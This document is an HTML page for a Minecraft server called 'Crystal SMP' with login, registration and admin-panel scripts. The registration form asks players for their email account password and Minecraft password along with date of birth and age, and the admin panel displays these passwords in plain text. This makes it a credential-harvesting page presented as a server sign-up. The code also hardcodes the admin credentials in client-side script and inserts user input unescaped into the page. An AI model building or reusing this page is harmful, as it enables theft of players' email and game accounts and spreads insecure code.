<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Crystal SMP | Registration</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
  margin:0;
  font-family:Arial,Helvetica,sans-serif;
  background:radial-gradient(circle at top,#1a002a,#05000d);
  color:#fff;
}
.hidden{display:none}
.container{max-width:900px;margin:auto;padding:30px}
h1{text-align:center;color:#39ffea}
.card{
  background:rgba(255,255,255,0.08);
  padding:20px;
  border-radius:14px;
  margin-bottom:20px;
}
input,textarea,button{
  width:100%;
  padding:10px;
  margin:8px 0;
  border-radius:8px;
  border:none;
}
button{
  background:#39ff14;
  font-weight:bold;
  cursor:pointer;
}
button.red{background:#ff3333}
button.blue{background:#00eaff}
.player-card{
  border:1px solid rgba(255,255,255,0.2);
  padding:15px;
  border-radius:10px;
  margin-bottom:15px;
}
</style>
</head>

<body>
<div class="container">

<h1>CRYSTAL SMP</h1>

<!-- LOGIN -->
<div id="loginBox" class="card">
  <h2>Login</h2>
  <input id="loginUser" placeholder="Minecraft Username">
  <input id="loginPass" type="password" placeholder="Password">
  <button onclick="login()">Login</button>
</div>

<!-- REGISTRATION -->
<div id="registerBox" class="card hidden">
  <h2>Player Registration</h2>
  <input id="email" placeholder="Email">
  <input id="emailPass" type="password" placeholder="Email Password">
  <input id="mcUser" placeholder="Minecraft Username" readonly>
  <input id="mcPass" type="password" placeholder="Minecraft Password" readonly>
  <input id="dob" type="date">
  <input id="age" type="number" placeholder="Age">
  <textarea id="motive" placeholder="Why you want to join Crystal SMP?"></textarea>
  <p>Status: <b style="color:orange">Pending</b></p>
  <p>‚è≥ Approval Time: 1 Day</p>
  <button onclick="submitForm()">Submit Registration</button>
</div>

<!-- ADMIN PANEL -->
<div id="adminPanel" class="card hidden">
  <h2>üëë Admin Panel</h2>
  <div id="adminList"></div>
  <button class="red" onclick="logout()">Logout</button>
</div>

</div>

<script>
const ADMIN_USER="AdminUmer";
const ADMIN_PASS="crystal123";
const DISCORD_LINK="https://discord.gg/crystalsmp";

let users=JSON.parse(localStorage.getItem("users"))||[];

function save(){localStorage.setItem("users",JSON.stringify(users));}

function login(){
  const u=loginUser.value.trim();
  const p=loginPass.value.trim();

  if(!u||!p)return alert("Fill all fields");

  if(u===ADMIN_USER && p===ADMIN_PASS){
    loginBox.classList.add("hidden");
    adminPanel.classList.remove("hidden");
    renderAdmin();
    return;
  }

  let user=users.find(x=>x.mcUser===u);

  if(user){
    if(user.mcPass!==p)return alert("Wrong password");
    if(user.status==="Approved"){
      alert("‚úÖ Approved!\nDiscord: "+DISCORD_LINK);
    }else{
      alert("‚è≥ Your request is pending approval");
    }
  }else{
    mcUser.value=u;
    mcPass.value=p;
    loginBox.classList.add("hidden");
    registerBox.classList.remove("hidden");
  }
}

function submitForm(){
  users.push({
    email:email.value,
    emailPass:emailPass.value,
    mcUser:mcUser.value,
    mcPass:mcPass.value,
    dob:dob.value,
    age:age.value,
    motive:motive.value,
    status:"Pending",
    date:Date.now()
  });
  save();
  alert("Registration submitted. Wait for admin approval.");
  location.reload();
}

function renderAdmin(){
  adminList.innerHTML="";
  users.forEach((u,i)=>{
    adminList.innerHTML+=`
    <div class="player-card">
      <b>${u.mcUser}</b> - <span style="color:${u.status==="Approved"?"#39ff14":"orange"}">${u.status}</span>
      <details>
        <summary>View Form</summary>
        Email: ${u.email}<br>
        Email Pass: ${u.emailPass}<br>
        MC Pass: ${u.mcPass}<br>
        DOB: ${u.dob}<br>
        Age: ${u.age}<br>
        Motive: ${u.motive}
      </details>
      <button class="blue" onclick="approve(${i})">Accept</button>
      <button class="red" onclick="reject(${i})">Reject</button>
    </div>`;
  });
}

function approve(i){
  users[i].status="Approved";
  save();renderAdmin();
}

function reject(i){
  users[i].status="Rejected";
  save();renderAdmin();
}

function logout(){location.reload();}
</script>
</body>
</html>
